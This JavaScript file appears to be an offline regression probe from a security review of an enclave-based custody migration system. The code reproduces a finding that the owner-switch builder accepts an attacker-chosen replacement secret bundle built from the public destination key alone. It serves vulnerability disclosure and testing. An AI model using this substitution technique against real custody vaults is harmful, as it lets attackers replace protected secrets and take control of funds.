// Offline regression probe: uses generated fixture keys and public demo payload only.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import {createHash} from 'node:crypto';
import {keccak256} from '../enclave/node_modules/viem/_esm/index.js';
import * as v2 from '../custody-owner-migration/tree/custody/v2/protocol.mjs';
import {checkResultAndSwitch,rewrapDigest,REWRAP_RUNTIME_ID,REWRAP_FORMAT} from '../custody-owner-migration/tree/custody/v2/rewrap.mjs';
const hex=b=>'0x'+Buffer.from(b).toString('hex'),h=n=>'0x'+n.repeat(64),chainId=8453,vault='0xe48699b8401564aace7a814ae4569b67a3f7eef5';
const dest=v2.genesis(),a={id:h('1'),sourcePolicyRev:'5',sourceSecretRev:'3',sourceCommitteeId:h('2'),sourceBundleHash:h('3'),destCommitteeId:h('4'),destKeyHash:keccak256(hex(dest.Y)),destCodeMeasurement:h('5'),destSecretRev:'4',leaseEndpoint:'https://lease.example',rewrapMeasurement:h('6'),rewrapRuntimeId:'0x'+REWRAP_RUNTIME_ID,expiry:'1800003600'};
const label=v2.labelOf({chainId,vault,id:a.id,secretRev:4n,committeeId:a.destCommitteeId});
// An untrusted host can compute this using only the public destination key. No source secret, owner key or TEE needed.
const replacement=v2.encryptBundle({Y:dest.Y,label,env:{PUBLIC_DEMO:'attacker-chosen replacement'},configSha256:'c'.repeat(64)});
const result={format:REWRAP_FORMAT,chainId,vault,authorizationDigest:rewrapDigest({chainId,vault,authorization:a}),authorization:a,checkedAtBlock:{number:'100',hash:h('7')},destination:{committeeId:a.destCommitteeId,secretRev:'4',label:hex(label)},bundle:hex(replacement),bundleHash:keccak256(hex(replacement)),bundleBytes:replacement.length};
const originalRules={v:1,appId:'a7'.repeat(32),images:[{platform:'sev-snp',measurement:'77'.repeat(48),runtimeId:'29'.repeat(32)}],minTcb:{Genoa:{bootloader:10,tee:0,snp:23,microcode:84}},vmpl:0};
const {switchUpdate}=checkResultAndSwitch({chainId,vault,authorization:a,result,originalRules});
assert.equal(switchUpdate.bundle,hex(replacement));assert.equal(switchUpdate.setBundle,true);
const source='work/custody-owner-migration/tree/custody/v2/rewrap.mjs';
console.log(JSON.stringify({finding:'Unauthenticated result substitution accepted by owner switch builder',status:'REPRODUCED; candidate must not activate',source,sourceSha256:createHash('sha256').update(fs.readFileSync(source)).digest('hex'),usedOwnerPrivateKey:false,usedSourcePlaintext:false,usedAttestation:false,constructedSwitch:true,chainTransactions:0},null,2));
